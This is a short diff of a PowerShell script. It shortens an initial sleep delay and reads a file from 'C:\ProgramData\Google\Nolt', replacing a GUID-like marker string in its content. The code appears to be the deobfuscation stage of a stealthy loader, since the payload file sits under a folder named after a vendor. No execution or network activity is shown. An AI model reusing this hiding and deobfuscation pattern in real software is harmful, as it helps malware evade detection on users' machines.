@@ -1,7 +1,7 @@
 
 Try {
 
-Start-Sleep -s 60
+Start-Sleep -s 9
 
 $C0 = Get-Content -Path 'C:\ProgramData\Google\Nolt'
 $Z0 = $C0.Replace('{BSOI-JDWS-WL4R-KDKI-7TTI-RD3Y}','A')
